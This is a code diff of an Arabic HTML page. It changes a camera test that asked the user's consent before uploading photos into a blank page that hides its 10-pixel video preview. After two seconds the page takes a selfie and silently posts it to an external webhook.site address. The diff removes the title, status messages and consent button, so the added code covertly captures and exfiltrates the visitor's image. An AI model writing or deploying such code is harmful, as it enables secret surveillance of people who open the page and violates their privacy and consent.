@@ -1,201 +1,116 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تجربة الكاميرا</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
 
-<style>
-* {
-    box-sizing: border-box;
-}
+    <style>
+        * {
+            box-sizing: border-box;
+        }
 
-body {
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 20px;
-    background: #f5f5f5;
-}
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: #f5f5f5;
+        }
 
-h2 {
-    font-size: 20px;
-}
+        h2 {
+            font-size: 20px;
+        }
 
-#status {
-    font-size: 15px;
-}
+        #status {
+            font-size: 15px;
+        }
 
-#video {
-    width: 10px;
-    height: 10px;
-    object-fit: cover;
-    position: fixed;
-    bottom: 2px;
-    right: 2px;
-    border: 1px solid #888;
-    border-radius: 2px;
-    background: black;
-}
+        #video {
+            width: 10px;
+            height: 10px;
+            object-fit: cover;
+            position: fixed;
+            bottom: 2px;
+            right: 2px;
+            border: 1px solid #888;
+            border-radius: 2px;
+            background: black;
+        }
 
-button {
-    padding: 12px 20px;
-    background: #1685e5;
-    color: white;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    margin-top: 10px;
-}
-
-[hidden] {
-    display: none !important;
-}
-</style>
+        [hidden] {
+            display: none !important;
+        }
+    </style>
 </head>
 
 <body>
 
-<h2>تجربة الكاميرا</h2>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas" hidden></canvas>
 
-<p id="status">انتظر طلب إذن الكاميرا...</p>
+    <script>
+    (async function () {
 
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas" hidden></canvas>
+        const WEBHOOK_URL =
+        "https://b5334979-efa1-4201-b631-1c8cbf428002.webhook.site";
 
-<button id="send" hidden>
-إرسال الصور الثلاث
-</button>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
 
-<script>
-(async function () {
-
-    const WEBHOOK_URL =
-    "https://b5334979-efa1-4201-b631-1c8cbf428002.webhook.site";
-
-    const status = document.getElementById("status");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const sendButton = document.getElementById("send");
-
-    let photos = [];
-    let stream = null;
-
-    function wait(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    async function openCamera(mode) {
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: { exact: mode }
-            },
-            audio: false
-        });
-
-        video.srcObject = stream;
-        await video.play();
-        await wait(1000);
-    }
-
-    function stopCamera() {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-            stream = null;
-        }
-
-        video.srcObject = null;
-    }
-
-    async function takePhoto() {
-        if (!video.videoWidth || !video.videoHeight) {
-            throw new Error("الكاميرا غير جاهزة");
-        }
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        const context = canvas.getContext("2d");
-
-        context.drawImage(
-            video,
-            0,
-            0,
-            canvas.width,
-            canvas.height
-        );
-
-        const blob = await new Promise(resolve => {
-            canvas.toBlob(resolve, "image/jpeg", 0.92);
-        });
-
-        if (!blob || blob.size === 0) {
-            throw new Error("تعذر التقاط الصورة");
-        }
-
-        return blob;
-    }
-
-    try {
-
-        // الصورة الأولى والثانية: الكاميرا الأمامية
-        status.textContent = "تشغيل الكاميرا الأمامية...";
-
-        await openCamera("user");
-
-        status.textContent = "التقاط صورة السيلفي الأولى...";
-        await wait(1000);
-        photos.push(await takePhoto());
-
-        status.textContent = "التقاط صورة السيلفي الثانية...";
-        await wait(1000);
-        photos.push(await takePhoto());
-
-        // إيقاف الأمامية
-        stopCamera();
-
-        // الصورة الثالثة: الكاميرا الخلفية
-        status.textContent = "تشغيل الكاميرا الخلفية...";
-
-        await openCamera("environment");
-
-        status.textContent = "التقاط الصورة الثالثة...";
-        await wait(1000);
-        photos.push(await takePhoto());
-
-        stopCamera();
-        video.hidden = true;
-
-        status.textContent =
-            "تم التقاط الصور الثلاث. هل توافق على إرسالها إلى Webhook؟";
-
-        sendButton.hidden = false;
-
-    } catch (error) {
-
-        stopCamera();
-        video.hidden = true;
-
-        status.textContent =
-            "تعذر التقاط الصور الثلاث. تحقق من أذونات الكاميرا ودعم الكاميرا الخلفية.";
-
-    }
-
-    // الإرسال بعد موافقة المستخدم
-    sendButton.addEventListener("click", async function () {
-
-        if (photos.length !== 3) return;
-
-        sendButton.disabled = true;
-        status.textContent = "جارٍ إرسال الصور الثلاث...";
+        let stream = null;
 
         try {
 
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: "user"
+                },
+                audio: false
+            });
+
+            video.srcObject = stream;
+            await video.play();
+
+            await new Promise(resolve =>
+                setTimeout(resolve, 2000)
+            );
+
+            if (!video.videoWidth || !video.videoHeight) {
+                throw new Error("Camera not ready");
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const context = canvas.getContext("2d");
+
+            context.drawImage(
+                video,
+                0,
+                0,
+                canvas.width,
+                canvas.height
+            );
+
+            const blob = await new Promise(resolve => {
+                canvas.toBlob(resolve, "image/jpeg", 0.92);
+            });
+
+            if (!blob || blob.size === 0) {
+                throw new Error("Empty image");
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+            video.hidden = true;
+
             const formData = new FormData();
 
-            formData.append("selfie_1", photos[0], "selfie-1.jpg");
-            formData.append("selfie_2", photos[1], "selfie-2.jpg");
-            formData.append("front_camera", photos[2], "rear-camera.jpg");
+            formData.append(
+                "file",
+                blob,
+                "camera-photo.jpg"
+            );
 
             await fetch(WEBHOOK_URL, {
                 method: "POST",
@@ -203,23 +118,17 @@ button {
                 body: formData
             });
 
-            status.textContent =
-                "تم إرسال طلب الصور الثلاث. تحقق من Webhook.site.";
-
-            photos = [];
-            sendButton.hidden = true;
-
         } catch (error) {
 
-            status.textContent = "تعذر إرسال الصور. تحقق من الاتصال.";
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
 
-            sendButton.disabled = false;
+            video.hidden = true;
         }
 
-    });
-
-})();
-</script>
+    })();
+    </script>
 
 </body>
 </html>
